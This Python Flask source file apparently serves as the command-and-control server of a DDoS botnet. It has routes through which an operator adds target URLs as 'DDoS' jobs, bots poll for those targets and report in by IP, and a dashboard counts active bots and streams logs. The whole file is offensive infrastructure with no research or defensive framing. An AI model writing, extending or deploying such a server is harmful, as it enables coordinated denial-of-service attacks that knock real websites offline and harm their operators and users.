from flask import Flask, request, jsonify, render_template
import db
import pymongo
from datetime import datetime, timedelta
import functions
import config
import pytz
import logging

config = config.get_config()

app = Flask(__name__)

from flask_socketio import SocketIO

socketio = SocketIO(app)


JOB_TYPES = ["DDoS"]

# Configure logging
log_file_path = "flask_app.log"  # Change to your desired log file path
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s [%(levelname)s] - %(message)s')

def get_jobs():
    job = list(db.jobs_collection.find({"done": False}, sort=[("priority", pymongo.ASCENDING)]))
    return [jobbet["url"] for jobbet in job if jobbet is not None]


@app.route("/get_version/")
def get_version():
    with open("version.txt", "r") as f:
        version = f.read()
    return jsonify({"version": version})

@app.route("/ping/")
def ping():
    ip_address = request.remote_addr
    db.pings_collection.insert_one({"ip": ip_address, "time": datetime.now(), "access_route": request.access_route})
    to_prioritize = functions.check_and_notify()
    logging.info(f"Received ping from IP: {ip_address}, To prioritize: {to_prioritize}")
    return jsonify({"status": "ok", "prioritize": to_prioritize})

def insert_or_update_ip(ip_address):
    hi_collection = db.hi_collection
    existing_record = hi_collection.find_one({"ip": ip_address})

    if existing_record is None:
        hi_collection.insert_one({"ip": ip_address, "last_hi": datetime.now(), "his": [datetime.now()]})
        logging.debug(f"New record inserted for IP: {ip_address}")
    else:
        # Update existing record
        hi_collection.update_one(
            {"ip": ip_address},
            {"$set": {"last_hi": datetime.now()}, "$push": {"his": datetime.now()}}
        )
        logging.debug(f"Record updated for existing IP: {ip_address}")

@app.route("/hi/")
def hi():
    ip_address = request.remote_addr

    # Insert or update IP in the hi_collection
    insert_or_update_ip(ip_address)
    logging.info(f"Received 'hi' from IP: {ip_address}")

    return jsonify({"status": "ok"})

@app.route("/active_clients/")
def active_clients():
    # Assuming 'last_connection' is the field in your collection representing the last connection date
    today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    query = {"last_hi": {"$gte": today, "$lt": today + timedelta(days=1)}}

    clients = list(db.hi_collection.find(query))
    
    clients_list = []

    for client in clients:
        client["_id"] = str(client["_id"])
        clients_list.append(client)

    return jsonify({"status": "ok", "clients": clients})

@app.route("/active/")
def active():
    return render_template("v2.html")

@app.route("/get_job/")
def get_job():
    jobs = get_jobs()
    if not jobs:
        return jsonify({"status": "no_jobs"})
    logging.info(f"Sent job to IP: {request.remote_addr}")
    return jsonify({"status": "ok", "url": jobs, "job_type": "DDoS"})

@app.route("/add_job/", methods=["POST"])
def add_job():
    data = request.json
    job_type = data.get("job_type", None)
    if job_type not in JOB_TYPES:
        logging.error(f"Invalid job type received: {job_type}")
        return jsonify({"status": "error", "message": "Invalid job type!"})
    if job_type == "DDoS":
        target_url = data.get("target_url", None)
        db.jobs_collection.insert_one({"url": target_url, "job_type": job_type, "done": False, "priority": functions.get_highest_priority()+1})
        logging.info(f"Job added - Type: {job_type}, Target URL: {target_url}")
    return jsonify({"status": "ok"})

@app.route("/get_clients_count/")
def get_clients_count():
    timezone_utc_minus_3 = pytz.timezone("UTC")
    current_time_utc = datetime.now(pytz.utc)
    thirty_minutes_ago_utc_minus_3 = current_time_utc - timedelta(minutes=30)

    # Aggregate distinct IP addresses and their counts in the last 30 minutes
    counts_over_time = list(db.pings_collection.aggregate([
        {"$match": {"time": {"$gte": thirty_minutes_ago_utc_minus_3}}},
        {"$group": {"_id": "$ip", "count": {"$sum": 1}}},
        {"$project": {"_id": 0, "ip": "$_id", "count": 1}}
    ]))

    thirty_minutes_ago = thirty_minutes_ago_utc_minus_3.astimezone(timezone_utc_minus_3)
    total_count = sum(item["count"] for item in counts_over_time)

    logging.info(f"Sent clients count to IP: {request.remote_addr}")
    return jsonify({"clients_count": total_count, "clients_counts_over_time": counts_over_time})

@app.route("/get_jobs_list/")
def get_jobs_list():
    jobs = list(db.jobs_collection.find())
    for job in jobs:
        job["_id"] = str(job["_id"])
    logging.info(f"Sent jobs list to IP: {request.remote_addr}")
    return jsonify({"jobs": jobs})

@app.route("/")
def dashboard():
    logging.info(f"Accessed dashboard by IP: {request.remote_addr}")
    return render_template("index.html")

import time

def read_logs():
    log_file_path = "flask_app.log"
    while True:
        with open(log_file_path, 'r') as log_file:
            logs_content = log_file.read()
            socketio.emit('update_logs', {'logs': logs_content})
        time.sleep(1)  # Adjust the interval as needed


@app.route("/dashboard/")
def dashboard1():
    logging.info(f"Accessed dashboard by IP: {request.remote_addr}")
    return render_template("dashboard.html")

@socketio.on('connect')
def handle_connect():
    socketio.emit('update_logs', {'logs': 'Connected to Flask-SocketIO'})

@app.route("/sent_jobs/")
def sent_jobs():
    log_file_path = "flask_app.log"
    jobs_sent = set()

    with open(log_file_path, 'r') as log_file:
        for line in log_file:
            if "Sent jobs list to IP:" in line:
                ip_address = line.split(":")[-1].strip()
                jobs_sent.add(ip_address)

    return render_template("sent_jobs.html", jobs_sent=jobs_sent)

if __name__ == "__main__":
    # Start a separate thread to continuously read and emit logs
    import threading
    log_thread = threading.Thread(target=read_logs)
    log_thread.start()

    socketio.run(app, host=config.get("host"), port=config.get("port"))